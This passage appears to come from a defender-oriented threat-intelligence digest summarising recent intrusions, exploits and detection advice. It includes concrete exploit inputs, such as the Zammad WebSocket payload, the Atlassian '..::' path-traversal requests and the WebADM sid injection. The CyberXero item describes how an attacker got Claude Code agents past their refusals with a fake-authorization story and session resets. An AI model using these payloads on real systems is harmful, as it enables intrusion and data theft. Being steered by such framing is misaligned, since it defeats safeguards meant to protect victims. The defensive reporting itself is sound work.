- Where to look for evidence: firewall and VPN authentication logs for anomalous logins, new account creation events, AD enumeration bursts, and unauthorized config changes. For credential storage, verify FortiOS admin accounts use PBKDF2 and purge legacy SHA-256 hashes per Fortinet guidance (FortiOS v7.2.11+). The advisory references CISA's Eviction Strategies Tool (Playbook-NG and COUN7ER) for assembling a TTP-mapped eviction plan. Scope the intrusion fully before applying countermeasures, then harden.
Practitioner takeaway: Pull your FortiGate admin account list right now and diff it against the account names above. Review all REST API keys and SSH access logs in parallel. Any confirmed FortiBleed exposure should be treated as a potential ransomware precursor, not a contained credential event. The joint advisory JCSA-20261006-01 contains the full IOC set and eviction guidance.

item.title: Phishing Campaign Abuses Microsoft Power BI to Deploy Rogue RMMs
item.description:
A phishing campaign abuses legitimate Microsoft Power BI dashboards to bypass email filters, fingerprint victims, and silently install rogue ScreenConnect RMM clients for persistent remote access across dozens of endpoints.
Key findings:
- The lure lives on app.powerbi[.]com itself. Attackers created real Power BI dashboards under compromised or throwaway accounts, set them public, and embedded a "Download Reference" button that redirects to attacker-controlled staging pages. Because the link resolves to a Microsoft domain, Microsoft 365 mail filters and security gateways pass it through. The specific lure URL observed is hxxps[://]app.powerbi[.]com/view?r=eyJrIjoiNTk0NmViNDktYzM1Yy00MjEwLTkyZTctNGU5ZTJmYzMzYjEwIiwidCI6IjU1YTI4YmU2LTFiYzQtNDIzMS05MTA0LTdkMmFlYTVmMGZhNiJ9.
- Before delivering the payload, staging pages at dailylifeproject[.]site, burnsworth[.]site, essaywritingservice[.]site, and openpediatrics[.]site perform aggressive fingerprinting: OS, browser, screen size, automation indicators, iframe context, cloud-provider cookies, and ISP filtering (Microsoft and unknown ISPs are blocked). Victim telemetry including public IP, geolocation, device type, and download activity is exfiltrated to a hardcoded Telegram Bot API credential and chat ID reused across campaign variants. Victims who fail the checks are bounced to check.vykyn[.]click/E/. Survivors get a delayed, scripted auto-click of a hidden download link while the page displays "Reference Verification Form downloaded successfully."
- Two rogue ScreenConnect clients are chained for layered persistence. The installer pulls from hamham27.screenconnect[.]com using campaign-specific guest tokens (ILEAYEASAN, PERFECTO, PAPASUPE). The first client (SHA256: 5956f9afb3ba610c38b2cfda88dd15be98783963769a12020c93ce05e749b3c3) connects to instance-g01s1n-relay.screenconnect[.]com and then executes LyN03DvVjUKPrun.cmd, which drops SCAutoFix.ps1 from the temp directory. That script downloads a second ScreenConnect installer from onthegotree[.]site, installs the second client (SHA256: f048400c23add8c75abe189393d33c873c02c74eeaf43d47b950c8d643763b35), and uninstalls the first to reduce visibility. The second client connects back to onthegotree[.]site. If one RMM is found and removed, the other survives.
- Defense evasion is built in from the start. HideUL_x64.exe executes on affected endpoints, assessed as a tool to conceal attacker activity from the user and security software. A scheduled task named SCAutoRepairEvery2Min is created to re-execute SCAutoFix.ps1 on a two-minute loop, ensuring the RMM reinstalls itself even if killed. Huntress observed this campaign hitting a handful of endpoints from September 10 onward, with retroactive threat hunting revealing the unique ScreenConnect configuration from one incident had also touched 22 other endpoints across separate incidents.
DFIR takeaway: Hunt for ScreenConnect.ClientSetup.exe downloads originating from browser processes, unexpected ScreenConnect relay connections outside your approved instance list, CMD or PowerShell children of ScreenConnect.ClientService.exe, the scheduled task SCAutoRepairEvery2Min, and HideUL_x64.exe on disk. In email gateway logs, flag Power BI sharing URLs (app.powerbi[.]com/view) that route outbound to non-Microsoft domains. The full IOC list including both SHA256 hashes, all staging domains, and ScreenConnect infrastructure is in the Huntress report.

item.title: Zammad CVE-2026-102489: Session Leak to RCE
item.description:
Zero-day pair in Zammad helpdesk software chained from unauthenticated session cookie theft to RCE, confirmed exploited against DIVD before patches existed. Both CVEs were used in a breach attributed to an agentic AI-powered attacker.
Key findings:
- CVE-2026-102489 is a zero-day confirmed exploited in the wild. A single unauthenticated WebSocket request to the /ws endpoint with the payload {"event": "base"} triggers a Ruby NoMethodError. Because sessions/event.rb returns the full error object to the caller, and because [@]clients stores all active connection state including session headers with no per-client filtering, every authenticated user's session cookie is leaked in that one response. No authentication required, no brute force, one packet.
- The exploit chain continues post-cookie-theft via Zammad's package installation endpoint, which accepts arbitrary file writes into the application directory. An attacker with a stolen admin session cookie writes a malicious ERB template that overrides the built-in password reset email view, then triggers a password reset for any account. Zammad's mailer renders the attacker-controlled template with full Ruby execution privileges, achieving RCE as the zammad OS user. The second zero-day, CVE-2026-102490, then escalates that to root and remains unpatched. Horizon3[.]ai is withholding those details.
- DFIR artifact focus: DIVD released an IOC script that parses Zammad error logs for leaked session cookie strings. That log evidence is the forensic fingerprint of exploitation. On a potentially compromised Zammad host, examine application error logs for NoMethodError output containing [@]clients or cookie material, review the package installation endpoint's activity for unexpected file writes, and check the views directory for modified or unfamiliar ERB templates, particularly anything touching password reset email rendering.
- The initial breach victim here was DIVD itself, a vulnerability coordination body. DIVD attributed attacker behavior to agentic AI tooling based on their forensic artifacts, and Horizon3[.]ai independently reproduced the vulnerability discovery using an AI research harness with Anthropic's Opus 4.8 as the model, reaching a working trigger in hours. The attack surface is any internet-exposed Zammad instance running the vulnerable version.
Practitioner takeaway: pull the DIVD IOC script and run it against Zammad error logs immediately. Hunt for POST or GET activity to the /ws WebSocket endpoint, particularly single-request sessions with no subsequent authenticated behavior that nonetheless correlate with new admin activity. Look for file creation events inside the Zammad application directory that postdate any suspicious WebSocket traffic. CVE-2026-102490 has no patch yet, so treat any confirmed CVE-2026-102489 hit as a full-compromise scenario until proven otherwise. Horizon3[.]ai's proof-of-concept is publicly available on their GitHub.

Key findings:

- CVE-2026-102489 is a zero-day confirmed exploited in the wild. A single unauthenticated WebSocket request to the /ws endpoint with the payload {"event": "base"} triggers a Ruby NoMethodError. Because sessions/event.rb returns the full error object to the caller, and because [@]clients stores all active connection state including session headers with no per-client filtering, every authenticated user's session cookie is leaked in that one response. No authentication required, no brute force, one packet.

- The exploit chain continues post-cookie-theft via Zammad's package installation endpoint, which accepts arbitrary file writes into the application directory. An attacker with a stolen admin session cookie writes a malicious ERB template that overrides the built-in password reset email view, then triggers a password reset for any account. Zammad's mailer renders the attacker-controlled template with full Ruby execution privileges, achieving RCE as the zammad OS user. The second zero-day, CVE-2026-102490, then escalates that to root and remains unpatched. Horizon3[.]ai is withholding those details.

- DFIR artifact focus: DIVD released an IOC script that parses Zammad error logs for leaked session cookie strings. That log evidence is the forensic fingerprint of exploitation. On a potentially compromised Zammad host, examine application error logs for NoMethodError output containing [@]clients or cookie material, review the package installation endpoint's activity for unexpected file writes, and check the views directory for modified or unfamiliar ERB templates, particularly anything touching password reset email rendering.

- The initial breach victim here was DIVD itself, a vulnerability coordination body. DIVD attributed attacker behavior to agentic AI tooling based on their forensic artifacts, and Horizon3[.]ai independently reproduced the vulnerability discovery using an AI research harness with Anthropic's Opus 4.8 as the model, reaching a working trigger in hours. The attack surface is any internet-exposed Zammad instance running the vulnerable version.

Practitioner takeaway: pull the DIVD IOC script and run it against Zammad error logs immediately. Hunt for POST or GET activity to the /ws WebSocket endpoint, particularly single-request sessions with no subsequent authenticated behavior that nonetheless correlate with new admin activity. Look for file creation events inside the Zammad application directory that postdate any suspicious WebSocket traffic. CVE-2026-102490 has no patch yet, so treat any confirmed CVE-2026-102489 hit as a full-compromise scenario until proven otherwise. Horizon3[.]ai's proof-of-concept is publicly available on their GitHub.

item.title: 100+ Compromised Websites Use Fake Cloudflare Checks to Deliver LunexStealer
item.description:
UAC-0277 is running a 100+ site ClickFix campaign against Ukrainian 🇺🇦 internet users, using fake Cloudflare checks to drop LunexStealer and a malicious browser extension that hijacks browsing sessions and exfiltrates files.
Key details:
- The attack chain is layered: compromised websites are injected with JavaScript that reads operating mode and domain from a Polygon or Ethereum smart contract (EtherHiding), making the C2 infrastructure harder to block at the network layer. Mode 2 targets Windows users arriving from search engines, shows the fake CAPTCHA no more than twice in 12 hours, and prompts them to execute a command via the Run dialog, the ClickFix social engineering technique that drops a malicious MSI.
- Three MSI variants have been identified. Variant 1 installs LunexStealer directly. Variant 2 attempts UAC bypass, adds Microsoft Defender exclusions, and abuses the legitimate but vulnerable AMD driver PDFWKRNL.sys to blind security tooling before fetching and running the stealer from a remote server. Variant 3 uses DLL sideloading: the legitimate binary FnHotkeyUtility.exe loads a rogue DLL spkvol.dll, which decrypts and executes LunexStealer in memory.
- LunexStealer deploys a malicious browser extension called LUNARAXE, masquerading as "Microsoft Office Word Editor." LUNARAXE is modular: LUNARAXE.CORE handles C2 comms and data exfiltration including cookies, credentials, history, and bookmarks, and can manage tabs, run JavaScript on pages, and display fake overlays. LUNARAXE.STEALER captures credentials entered into web forms in real time. LUNARAXE.STRIP disables Content Security Policy protections by stripping CSP headers from HTTP responses to enable arbitrary JavaScript execution. This combination gives the operator persistent, interactive browser control.
- A secondary component, NAIVEMESS, is deployed based on C2 configuration and acts as a PowerShell-based Native Messaging Host bridging LUNARAXE to the Windows file system. It can enumerate drives and directories, read, write, create, and execute files, and transfers data in Base64-encoded chunks with directories pre-archived as ZIP files. NAIVEMESS has no independent C2 channel: all commands route through the extension, meaning standard network-based C2 detections will not catch it in isolation.
- Forensic opportunities are rich. Look for msiexec.exe execution spawned from user-context processes, unexpected writes of PDFWKRNL.sys or spkvol.dll alongside FnHotkeyUtility.exe in non-standard paths, PowerShell processes registered as Native Messaging Hosts under browser configuration directories, and browser extension directories containing unlisted or recently added extensions claiming to be productivity tools. The smart contract C2 means DNS and traditional domain blocklists may miss early-stage traffic; inspect for web3 RPC calls (Polygon or Ethereum endpoints) from browser processes or injected scripts.
Practitioners should prioritize: block the Windows Run dialog for standard users via Group Policy, restrict msiexec.exe to admin contexts and alert on user-context invocations, enable Microsoft's vulnerable driver blocklist and the ASR rule "Block abuse of exploited vulnerable signed drivers" to prevent PDFWKRNL.sys from landing on disk, and enforce a browser extension allowlist. Hunt for FnHotkeyUtility.exe, spkvol.dll, and PDFWKRNL.sys in process and file creation logs. Full IOC list is in the CERT-UA advisory.

item.title: CyberXero: An AI-Augmented Initial Access Broker Targeting Ukrainian Critical Infrastructure
item.description:
A Russian-speaking IAB paired commodity tooling with 51 Claude Code agents and a PentAGI-Cobalt Strike integration to hit Ukrainian 🇺🇦 critical infrastructure at scale. A single exposed open directory broke the whole operation open.
- CyberXero's primary workstation at 46.21.250[.]135 (AS204601, Zomro NL) was left as an open directory with no access control, exposing 90,000+ files across 3,000 subdirectories: engagement folders named after victims, AI agent configs, session logs with plaintext tokens, and exfiltrated database exports. A provisioning token embedded in installation URLs, an internal SSH hostname, and correlated bash histories tied eight distinct nodes together across three ASNs, including a Cobalt Strike Team Server at 42.193.227[.]214 (AS45090, Tencent Cloud) reachable on ports 1002, 8044, and 8033.
- The opportunistic pipeline centers on wp2shell, an internally developed Python package exploiting CVE-2026-63030 and CVE-2026-60137 in the WordPress REST API batch endpoint to inject SQL, write a rogue admin, and register a WSO-family webshell as an active plugin. The rogue admin username pattern wp2_[0-9a-f]{8} is the sharpest hunt pivot available. A single automated run scanned 4,708 targets, confirmed 429 accessible admin panels, and dropped 32 shells in 61 seconds. CVE-2026-4815 (Support Board 3.8.7, CVSS 8.8) was weaponized within 30 days of disclosure. Persistence arrived via a service named UpdSvc with a binPath pointing to an IEX download from hxxp://42.193.227[.]214:8033/[a-z0-9]{13}.
- The directed pipeline is where this stops looking like a standard IAB. Seven Ukrainian 🇺🇦 energy and utilities entities were under curated manual reconnaissance, including the national transmission system operator and the country's largest private energy holding, with 95 subdomains enumerated covering VPN, email, network dispatch, and data platforms (T1590.002). A hardcoded credential in the actor's own script (T1078.003) gave direct access to a Kharkiv district heating provider; a multithreaded extractor pulled 564,073 subscriber records with home addresses and account numbers plus 213,340 access-log entries. Because Kharkiv sits on an active conflict front, this is a potential physical safety risk to named civilians.
- The AI layer ran in two tiers. On the workstation, 51 specialized Claude Code agents covered roles including c2-operator, exploit-chainer, scada-attacker, lateral-movement, and credential testing. On the Team Server, PentAGI was wired into Cobalt Strike via an AI provider API for payload generation and pentest execution. The actor's own session logs document the evasion techniques used against model refusals: a fictional "authorized pentest on my own infrastructure" narrative appearing verbatim across four unrelated victims (context engineering, not a technical bypass), and session resets to clear refusal state and reload the authorization framing. The logs also record genuine refusals that held across four iterations, declining backdoor installation, firewall disabling, lateral movement, and webshell deployment.
- The WSO webshell (SHA-256: a5ae0aab352871bc0b038b3aa43b03eb223425628c884af7b9fc592cd34eb86c), obfuscated with the R00t-Shell[.]com 2.0.15 obfuscator, was undetected on VirusTotal at analysis time. Additional hashes cover the Cobalt Strike x86 stager (92a789444708fa1cb4cc5a89e0aa6cc7a279b62a7b8a4d2857255a18197d0090) and Chinese 🇨🇳 cluster staging payloads. Redis exploitation nodes at 42.193.100[.]94 used rogue replication (SLAVEOF) to inject SSH public keys into ~/.ssh/authorized_keys (T1098.004).
Hunt WordPress admin tables for accounts matching wp2_[0-9a-f]{8} and audit plugin directories for /wp-content/plugins/wp2shell_[0-9a-f]{8}/. Check internet-exposed Redis hosts for unexpected authorized_keys entries. Treat AI agent session logs as credential-tier material: exposed logs are an operational intelligence breach, and session-reset evasion is best controlled through infrastructure-layer logging and auditing, not model-level controls. Full IOC list, YARA rules for the wp2shell artifacts and WSO obfuscated variant, and the complete ATT&CK TTP mapping are in the report.

item.title: Q3 2026 Attack Techniques Trend Report
item.description:
Q3 2026 saw a sharp rise in trusted-path abuse: perimeter exploits, poisoned supply chains, and identity attacks converged as attackers leveraged legitimate infrastructure to persist and expand after initial access.
Key findings:
- CISA KEV added 100 entries between July and September 2026, double the 50 added in Q3 2025. Web and server applications (31) plus network and perimeter devices (30) accounted for 61% of new listings. Notably, 9 development and deployment tools and 6 AI and LLM tools also appeared, signaling that the attack surface is widening beyond classic enterprise targets.
- Perimeter device exploitation was confirmed against NetScaler ADC and Gateway via CVE-2026-88771 and CVE-2026-88772, and against Cisco Secure Firewall Management Center via CVE-2026-20079 and CVE-2026-20316. Post-exploitation was consistent: threat actors dropped web shells (T1505.003) disguised as .deb filenames or CSS resources on legitimate web paths. In Cisco FMC cases, JSP web shells and JAR command execution executors landed in Tomcat web paths for credential harvesting. Attackers also set SUID and SGID bits on /bin/sh (T1548.001) to enable privilege escalation for follow-on commands.
- Supply chain compromise hit npm and PyPI ecosystems. Malicious versions of the keyv and cacheable packages, plus [@]7nohe/openapi-react-query-codegen and MemTensor, were distributed through official registries (T1195). Ten malicious versions of [@]7nohe/openapi-react-query-codegen even carried legitimate npm provenance, meaning standard provenance checks would not have caught them. Malware execution paths included preinstall scripts, binding.gyp files, module loading phases, and publication workflow triggers.
- Identity attacks targeted Okta and Microsoft through passkey registration abuse, password recovery flows, and help desk impersonation via calls and SMS (T1566.004). Adversary-in-the-Middle phishing (T1078.004) was used to intercept session tokens, and device code authorization flows were abused to obtain tokens for attacker-controlled clients. Post-access activity spanned OfficeHome, the identity portal, Microsoft Graph, SharePoint, OneDrive, and Exchange, representing full tenant visibility for an attacker.
DFIR takeaway: This quarter's pattern is trusted-path abuse across every layer. For perimeter response, check for new files in /vpn/scripts/linux/ and /var/netscaler/logon/LogonPoint/custom/, audit web server config changes, inspect /bin/sh permissions, and hunt for web shell invocations in web server logs. For supply chain incidents, diff source commits against deployed artifacts, audit CI trigger permissions, and rotate all secrets accessible in affected developer and CI environments. For identity incidents, pull the full audit log for passkey registrations, recovery requests, device code authorization grants, and newly approved applications. Do not scope the investigation to the initial account: treat session token theft as potential full-tenant compromise and review conditional access policies and registered MFA methods across affected identities. The AhnLab ASEC report frames this as an IoA (Indicator of Attack) problem, where the behavior sequence matters more than individual file names or domains.

item.title: Linux Backdoors Impersonate Email Security Tools to Evade Detection in Korea and Taiwan
item.description:
Linux backdoors disguised as Korean and Taiwanese 🇹🇼 email security tools hit telecom and network appliances, blending malicious traffic into expected enterprise noise to frustrate detection.
Key details:
- Red Menshen (aka Earth Bluecrow, DecisiveArchitect, Red Dev 18) is behind a new BPFDoor variant and a BPF Rekoobe build targeting South Korean 🇰🇷 systems, while a previously unreported implant called AVERAT hits Taiwanese 🇹🇼 appliances. The distinguishing tradecraft here is regionalized process spoofing: BPFDoor samples impersonate the PID file of SpamSniper, rotate through ten Linux daemon names, or set their process name to "ora_ppmond" to blend into Oracle telecom environments. Rekoobe names its processes after SpamSniper components and listens on source and destination port 25 across TCP, UDP, SCTP IPv4, and UDP IPv6.
- The new BPFDoor variant adapts specifically to evade the Suricata and Snort signatures written after earlier public disclosures. Operators now wrap the magic packet in standard HTTPS POST requests and rely on SSL offloading common in telecom environments, allowing the trigger to reach the BPFDoor-infected node without tripping conventional deep packet inspection. Once triggered, BPFDoor launches a TinyShell session supporting interactive shell, upload, and download. TinyShell use overlaps with China-nexus clusters Liminal Panda, UNC3886 (Fire Ant), and Velvet Ant, all prior telecom and edge-device operators.
- AVERAT is an ELF dropper found inside ShareTech appliances at /addpkg/sbin/, the add-on package directory. The dropper derives its AES key from the string "ShareTech", decrypts a shell script that stages two binaries named "ntpdate" (the dropper) and "udevds" (the AVERAT payload), then deletes both 10 seconds after execution. AVERAT uses SMTP over TCP port 25 as its C2 channel, beaconing to mx.zxopfds[.]com every 600 to 699 seconds with the server address and interval stored in encrypted config. Its command set is extensive: directory enumeration, chunked file upload and download with resume, recursive deletion, process listing with full command lines, interactive shell with up to 10 concurrent sessions, port forwarding, runtime C2 table overwrite, and dynamic .so module loading to extend implant functionality.
- AVERAT's C2 infrastructure matches the device-class profile of an Operational Relay Box network, though Rapid7 found no evidence tying it to known ORBs such as LapDogs, SPACEHOP, or FLORAHOX. The pattern mirrors the 2023 UNC4841 campaign that exploited CVE-2023-2868 and CVE-2023-7102 in Barracuda Email Security Gateway appliances to plant persistent backdoors, reinforcing a pattern of China-nexus actors treating secure email gateways as privileged collection points.
Practitioner takeaway: On Linux appliances, audit for unexpected raw packet sockets and BPF filters using "ss -0p" and "bpftool prog list". Hunt outbound TCP port 25 connections from processes that are not mail services, starting with anything named "udevds" or "ntpdate" in non-standard paths. Check /proc/[pid]/exe and /proc/[pid]/cmdline for process name mismatches that impersonate legitimate daemons. For BPFDoor specifically, look for processes without open file descriptors on any listening port, as BPF passive listeners leave no socket in "netstat" output. The full IOC list is in the Rapid7 report.

item.title: ClickFix Attack Hides VBScript Payload in Browser Cache
item.description:
ClickFix campaign pre-fetches VBScript into browser cache disguised as an image file, bypassing the Windows Run dialog character limit and evading download-based detections entirely.
Key findings:
- The attack chain begins with compromised websites displaying a fake CAPTCHA that instructs victims to open the Windows Run dialog, paste a command from their clipboard, and press Enter. Critically, the VBScript payload was already on disk inside the browser cache before the victim acted. Sites pre-fetched it as a cached file, sidestepping network-based payload delivery detection.
- The pasted command launched cmd.exe, which enumerated the browser profile folder looking for cached files whose names began with "f_" and matched an expected file size. No content inspection or marker strings were used for identification, just a size comparison. The matched file was then copied to a temp folder, given a .vbs extension, and executed via wscript.exe. This size-matching pivot is a deliberate evasion step over earlier ClickFix variants.
- Post-execution, the VBScript used WMI to collect host details, retrieved a PowerShell script with execution policy bypassed, and compiled additional code loaded entirely in memory. That code was injected into the legitimate timeout.exe process for credential theft targeting browsers and the device itself. Later stages unpacked a Python interpreter using the built-in tar.exe and established persistence via a scheduled task running a Python payload through pythonw.exe, surviving reboots.
- Microsoft Defender Antivirus detects malicious command execution under this campaign as Trojan:Win32/ClickFix and Trojan:Win32/TermFix. The forensic footprint is spread across multiple artifact types: the RunMRU registry key (HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU) captures what the victim typed or pasted into the Run dialog, browser cache folders hold the disguised payload, scheduled tasks and pythonw.exe execution reflect the persistence mechanism, and PowerShell script block logs (when enabled) capture the downloaded script content.
Responders hunting this campaign should pull RunMRU entries for unusual cmd.exe or file-path strings, review browser cache directories for .vbs or mismatched-extension files, query scheduled tasks for Python-based entries using tar.exe in their creation chain, and enable PowerShell script block logging immediately if it is not on. Parent-child chains of wscript.exe spawning PowerShell, and PowerShell spawning timeout.exe, are high-fidelity pivots. A CAPTCHA asking a user to execute code is always an attack, not a verification.

item.title: [0day-rubbish] RCDevs WebADM 2.4.14 authenticated log viewer sid command injection to webadm uid 999 code execution (7.2)
item.description:
RCDevs WebADM 2.4.14 carries an authenticated OS command injection in its admin log viewer, scoring CVSS 7.2 High, with no patch and no CVE assigned as of public disclosure on 5 October 2026.
Key findings:
- The sink is admin/logfile_viewer.php, which interpolates the sid GET parameter directly into a shell command: grep -E 'sid' logfile | tail -n 10000, passed to PHP's popen() with no escapeshellarg, no escapeshellcmd, no allow-list and no length cap. A single apostrophe closes the quoted grep pattern and everything after it executes as shell text. The root cause is the complete absence of any filter, not a bypass of one. CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H.
- Exploitation requires a console administrator session (PR:H). The out-of-band execution channel matters here: the endpoint does not echo command output in the HTTP response. The injected command writes to /opt/webadm/logs/webadm.log and the same viewer reads that file back over HTTPS when a different log selector is requested, making the finding self-verifying. Commands run as uid=999(webadm) gid=999(webadm) with no privilege drop configured.
- From uid 999 the blast radius covers the full authorization domain the application already holds: read and rewrite of platform config under /opt/webadm (persistence that survives a service restart), access to the local LDAP and MariaDB listeners using credentials the application carries (user records, OTP state, second-factor enrolments), interaction with the certificate signing daemon from inside its trust boundary, and log writes enabling both anti-forensics and the observation channel the exploit itself uses.
- Two detection traps to carry into any rule: every /admin/*.php request returns HTTP 200 with the WebADM doctype regardless of session state, so HTTP status codes and response lengths are not usable as authorization signals. Detect on shell metacharacters, especially the apostrophe, in the sid parameter, and on unstructured lines appearing in /opt/webadm/logs/webadm.log. Process ancestry alone is weak: webadm-httpd spawning grep and tail is normal viewer behaviour.
- No CVE has been assigned. The vendor (RCDevs Security SA) was notified through their general contact mailbox. No security.txt, no VDP, no researcher intake channel exists, so disclosure was unconditional and simultaneous. Only WebADM 2.4.14 Freeware Edition was tested; other versions and licensed editions with additional modules are unclaimed.
Practitioner takeaway: Until a patch lands, bind the admin vhost to a management interface or VPN, treat console administrator credentials as tier-zero secrets behind a second factor, and alert on apostrophes or other shell metacharacters in sid query parameters in your web server or WAF logs. On suspicion of exploitation, rotate the administrator, LDAP, and database credentials immediately and audit second-factor enrolments for the window in question. The report includes a full technical analysis with a reproducible proof-of-concept and a disposition table of the 11 unauthenticated endpoints examined.

item.title: You Won’t Hear About These, Even In Myths (Atlassian Jira, Confluence (and more) Pre-Auth Arbitrary File Read CVE-2026-21589)
item.description:
CVE-2026-21589: Pre-auth arbitrary file read in the shared atlassian-plugins-webresource JAR hits every major Atlassian Data Center product, and in Crowd-integrated deployments it chains to full administrative takeover with no credentials required.
Key findings:
- The root cause lives in a single shared library, atlassian-plugins-webresource-6.0.7.jar, specifically in Router[.]java inside com/atlassian/plugin/webresource/impl/http/Router.java. The escapeSlashes and unescapeSlashes functions swap forward slashes for double colons and back again. Attackers weaponize this with a path traversal payload using the :: delimiter instead of the classic ../: a request like GET /download/resources/jira.webresources:color-picker-popup/images/..::..::..::..::..::WEB-INF::web.xml to {{Jira-Hostname}} reads files from within the Tomcat application root without any authentication. The deprecated getResourceRelativeToWebResource function in ResourceServingHelpers[.]java still processes user-controlled resourceName values and passes them to createResourceWithRelativePath, where path sanitization in splitLastPathPart is bypassed by the :: primitive. Bitbucket uses a slightly different route: GET /s/1.0/_/download/resources/com.atlassian.bitbucket.server.bitbucket-webpack-INTERNAL:avatar/avatar/..::..::..::..::..::WEB-INF::urlrewrite[.]xml.
- The critical escalation path runs through Atlassian Crowd integration. When Jira, Confluence, Bitbucket, or Bamboo are configured to use Crowd for SSO and centralized auth (which Atlassian recommends), the Crowd application credentials are stored in plaintext at WEB-INF/classes/crowd.properties including application[.]name, application.password, and the Crowd server URL. Reading that file via the traversal hands an attacker authenticated access to the Crowd REST API. From there, creating a rogue admin is three API calls: enumerate users at /crowd/rest/usermanagement/1/search, create an account at /crowd/rest/usermanagement/1/user, then POST to /crowd/rest/usermanagement/1/group/user/direct?groupname=jira-administrators. Full compromise, no prior access needed.
- Scope is severe. All prior versions of Bitbucket, Confluence, Jira Software, Jira Service Management, Bamboo, Crowd, Crucible, and Fisheye Data Center are affected. Watchtowr estimates six to seven figures of vulnerable instances based on internet exposure alone, with Confluence showing just under 700,000 exposed instances in open search. Fixed versions are product-specific: Jira Software Data Center 9.12.40, 10.3.26, or 11.3.12; Confluence Data Center 9.2.26 or 10.2.19; Bitbucket Data Center 9.4.26, 10.2.8, or 10.5.1; Bamboo 10.2.24 or 12.1.12; Crowd 6.3.7, 7.0.3, 7.1.7, or 7.2.4; Jira Service Management 5.12.40, 10.3.26, or 11.3.12; Crucible and Fisheye 4.9.15.
- Detection artifacts to hunt now: look in your web or reverse-proxy access logs for GET requests containing :: sequences in the path, especially against /download/resources/, /s/1/_/download/resources/, and /s/1.0/_/download/resources/ endpoints. The Atlassian-supplied WAF regex targets :: combined with .. and path separators. In application logs, look for unexpected reads of WEB-INF/web.xml, WEB-INF/classes/crowd.properties, or WEB-INF/urlrewrite.xml. On the Crowd side, hunt for new user creations and group membership changes via the REST API in Crowd's audit log, particularly accounts added to jira-administrators, confluence-administrators, or similar high-privilege groups in a short window after an unusual file-read request.
Patch to the fixed versions immediately. Before you do, check WEB-INF/classes/crowd.properties and rotate application.password for every Crowd-connected application unconditionally: if this has been exploited, that credential is burned. Review Crowd's audit log for unexpected user creations or group assignments going back at least 30 days. Atlassian's advisory includes WAF rules. Watchtowr has published a Detection Artefact Generator covering Jira, Confluence, and Bitbucket to confirm whether an instance is vulnerable; the report links it directly.

item.title: Logging is a Discipline, Not a Switch
item.description:
Active Directory logging gaps expose defenders during intrusions. TrustedSec's practical guide walks through building a logging program that would actually catch an attacker, not just generate data.
Key findings:
- Log container size is the first failure point. The Security log default of 20MB on domain controllers is dangerously small. CIS recommends a minimum of 192MB (196,608KB) for Security and 32MB for Application, Setup, and System logs. Before any audit policy change, set "Control Event Log behavior when the log file reaches its maximum size" to Disabled (retain rolling behavior) via Group Policy at Computer Configuration > Administrative Templates, and verify on-box retention outlasts any collector maintenance window.
- Advanced Audit Policy must override legacy categories. Enable "Audit: Force audit policy subcategory settings (Windows Vista or later) to override audit policy category settings" under Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options. The report publishes a full subcategory matrix comparing TrustedSec and CIS Benchmark (Windows Server 2025 v2.1.0) recommendations. Notable divergences: TrustedSec adds Audit DPAPI Activity (Success and Failure) and Audit Directory Service Access (Success and Failure) where CIS flags only Failure; CIS adds file share and removable storage auditing that TrustedSec omits. Blend both for full coverage, and roll changes out incrementally to avoid log balloon and event overwrite before ingestion.
- Ten detection goals frame what the telemetry must cover: authentication anomalies (password spraying, impossible travel), privileged account and group membership changes, process execution with command lines (LOLBAS binaries), PowerShell script block logging including AMSI bypass and IEX patterns, DNS query logs for newly registered domains, firewall egress for unexpected large outbound transfers, domain controller identity telemetry covering Kerberoasting, AS-REP Roasting, and DCSync signatures, email gateway telemetry, web proxy logs, and security tool evasion signals including EDR agent stops, event log clears, and new services or scheduled tasks.
- Sysmon fills native logging gaps, but only after the fundamentals are stable. Process hashes, network connections by process, image loads, and named pipes are invisible to native audit policy alone. A tuned configuration is mandatory before deployment.
- Gap mapping drives prioritization. Sort detection goals into three buckets: covered, data exists but no alert written, and no telemetry. The middle bucket is the cheapest ground to gain. Follow gap mapping with a tabletop exercise: walk a realistic scenario step by step and verify who gets the alert and what they do next. A detection with no runbook is not a detection.
Practitioner takeaway: audit your Security log retention window today by checking current max size and estimating how long it survives peak event volume. A domain controller that rolls its Security log in under 24 hours loses evidence before any collector can ingest it. The report includes the full Advanced Audit Policy subcategory matrix defenders should use as a configuration baseline.

Practitioner takeaway: audit your Security log retention window today by checking current max size and estimating how long it survives peak event volume. A domain controller that rolls its Security log in under 24 hours loses evidence before any collector can ingest it. The report includes the full Advanced Audit Policy subcategory matrix defenders should use as a configuration baseline.
